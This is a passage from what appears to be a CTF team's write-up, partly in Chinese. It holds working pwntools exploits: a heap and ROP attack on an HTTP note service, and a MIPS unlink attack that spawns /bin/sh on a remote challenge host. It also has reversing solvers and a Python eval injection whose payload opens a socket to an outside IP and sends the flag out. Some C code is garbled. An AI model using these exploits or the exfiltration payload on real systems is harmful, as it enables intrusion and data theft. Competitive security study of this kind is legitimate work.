req += '\r\n' 
return req 
def create(content): 
pay = http_req('POST','/create','content='+content) 
p.send(pay) 
p.recvuntil('ok') 
def dele(idx): 
pay = http_req('POST','/del','index='+str(idx)) 
p.send(pay) 
p.recvuntil('Delete success!') 
def edit(idx,content): 
pay = http_req('POST','/edit','index='+str(idx)+'&content='+content) 
p.send(pay) 
p.recvuntil('ok') 
pay1 = http_req('POST','/create','content='+'a'*0xa0)#0 
p.send(pay1) 
p.recvuntil('Your gift: 0x') 
addr = int(p.recvuntil('\"')[:-1],16) 
print hex(addr) 
heap_addr = addr 
create('b'*0xa0)#1 
create('a'*0x30)#2 
create('a'*0xf0)#3 
for i in range(7): 
dele(1) 
dele(0) 
a = 0xe7#int(raw_input("a"),16) 
create('\x60'+chr(a))#4 
dele(2) 
dele(2) 
create('a'*0x30)#5 
edit(5,p64(addr)) 
create('\x60'+chr(a))#6 
create('a'*0x30)#7 
create('a'*0x30)#8 
create(p64(0xfffffffffbad2887)+'a'*0x28)#9 
pay = http_req('POST','/edit','index='+str(9)+'&content='+(p64(0xfbad3c80)+p64(0)*3+p8(0))) 
p.send(pay) 
p.recvuntil('\x00'*8) 
addr = u64(p.recv(8)) 
print hex(addr) 
libc_base=addr - (0x00007f01810478b0-0x7f0180c5a000) 
print hex(libc_base) 
pop_rdi = 0x000000000002155f +libc_base 
syscall = 0x00000000000d29d5 +libc_base 
pop_rax = 0x0000000000043a78 +libc_base 
pop_rdx = 0x0000000000001b96 +libc_base 
pop_rsi = 0x0000000000023e8a+libc_base 
create('a'*0xa0)#10 
edit(10,p64(4118760+libc_base)) 
create('a'*0xa0)#11 
create('a'*0xa0)#12 free_hook 
edit(12, p64(libc_base +0x52145)) 
raw_input("xxx") 
edit(3,('flag\x00\x00\x00\x00').ljust(0x68,'\x00')+p64(heap_addr+(0x400-0x260))+p64(0)+'\x00'*(0xa0-
0x70-8)+p64(heap_addr+(0x310-0x260))+p64(pop_rax)) 
edit(11,p64(2)+p64(syscall)+p64(pop_rdi)+p64(4)+p64(pop_rsi)+p64(heap_addr+(0x410-
0x260))+p64(pop_rdx)+p64(0x30)+p64(pop_rax)+p64(0)+p64(syscall)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+
p64(heap_addr+(0x410-0x260))+p64(pop_rdx)+p64(0x30)+p64(pop_rax)+p64(1)+p64(syscall)) 
pay = http_req('POST','/del','index='+str(3)) 
p.send(pay) 
p.interactive() 
managesystem 
from pwn import * 
#p = process(['./qemu-mipsel-static' , '-L', '.' ,'./ms']) 
p = remote('183.129.189.61',51603) 
def add(size,mess): 
p.recvuntil('>>') 
p.sendline('1') 
p.recvuntil('length') 
p.sendline(str(size)) 
p.recvuntil('info') 
p.send(mess) 
def dele(idx): 
p.recvuntil('>>') 
p.sendline('2') 
p.recvuntil('user') 
p.sendline(str(idx)) 
def edit(idx,mess): 
p.recvuntil('>>') 
p.sendline('3') 
p.recvuntil('edit') 
p.sendline(str(idx)) 
p.recvuntil('info') 
p.send(mess) 
add(0x64,p32(0)+p32(0x65)+p32(0x411830-12)+p32(0x411830-8)+'\n') 
add(0x60,'aaaa\n') 
add(0x20,'a\n') 
print "wait" 
edit(0,(p32(0)+p32(0x61)+p32(0x411830-12)+p32(0x411830-8)).ljust(0x60,'\x00')+p32(0x60)+p32(0x68)) 
dele(1) 
edit(0,p64(0)+p32(0x411830)+p32(0x100)+p32(0x04117B4)+p32(0x100)) 
p.recvuntil('>>') 
p.sendline('4') 
p.recvuntil('show') 
p.sendline('1') 
p.recvuntil('info: ') 
addr = u32(p.recv(4)) 
print hex(addr) 
libc_base = addr-0x56b68 
system = libc_base+0x5f8f0 
print hex(libc_base) 
edit(1,p32(system)+'\n') 
add(0x18,'/bin/sh\n') 
dele(3) 
p.interactive() 
RE 
flow 
#include  
#include  
void encrypt(uint32_t* v, uint32_t* k) { 
uint32_t v0 = v[0], v1 = v[1], sum = 0, i; 
uint32_t delta = 0x9e3779b9; 
uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; 
for (i = 0; i > 5) + k1); 
v0 += ((v1 > 5) + k3); 
} 
v[0] = v0; v[1] = v1; 
} 
void decrypt(uint32_t* v, uint32_t* k) { 
uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; 
uint32_t delta = 0x9e3779b9; 
uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; 
for (i = 0; i > 5) + k3); 
v1 -= ((v0 > 5) + k1); 
sum -= delta; 
} 
v[0] = v0; v[1] = v1; 
} 
int main() 
{ 
uint8_t k8[] = { 0x61,0x73,0x75,0x79,0x73,0x64,0x79,0x79,0xEF,0xBE,0xAD,0xDE,0x14,0x45,0x11,0xAA }; 
uint32_t* k = (uint32_t*)k8; 
uint8_t tmp[] = { 0x5c, 0xe3, 0x9b, 0x18, 0x1a, 0x83, 0x9, 0x11, 0x74, 0x8, 0x53, 0x3e, 0xeb, 0x98, 0x88, 
0x4b ,0 }; 
uint32_t* v = (uint32_t*)tmp; 
for (int i = 0; i < 2; i++) { 
decrypt(v + i * 2, k); 
} 
uint8_t tbl[] = { 0x60,0xcf,0xb4,0xe7,0x52,0x33,0x98,0xe6,0xc0,0xb5,0x1d,0x08,0x8a,0xe2,0x5e,0x86 }; 
for (int i = 0; i < 16; i++) { 
printf("%02x", tmp[i] ^ tbl[i]); 
} 
return 0; 
} 
loader 
把批处理里面后面几句加上 echo，可以发现密码 114514 
分析程序，程序获取密码解密 code，之后加载 code 中的代码并且执行，直接在程序获取输
入的时候停下来，之后不断回溯，即可找到关键验证函数
在 ida 里面分析发现是个逐位亦或，直接逆回去即可 
en_flag = '02 0D 6A 1A 27 7F 32 65 86 A5 C5 D7 CF DD E3 98 3D 79 53 6A 18 54 37 14 A9 E0 82 B2 CE 80 C
D 8C'.replace(' ','').decode('hex') 
s = 'PEFile' 
res = '' 
for i in xrange(32): 
    res += chr(ord(en_flag[i]) ^ (((i|0xe3) + ord(s[i%6]))&0xff) ^ ((16*i)&0xff)) 
Misc 
Yusa_yyds 
xbox 手柄振动报文，振动几次停 2s，114514 md5 即可 
Crypto 
CTF 小白的密码系统 
程序通过 eval 来 parse 数据，直接在输入 iv 的时候 rce 即可 
114514 if exec("import socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\\"123.
207.228.51\\",23333));s.send(flag.encode())") else 114514 
BrokenSystems 
wiener attack 恢复 d 直接解即可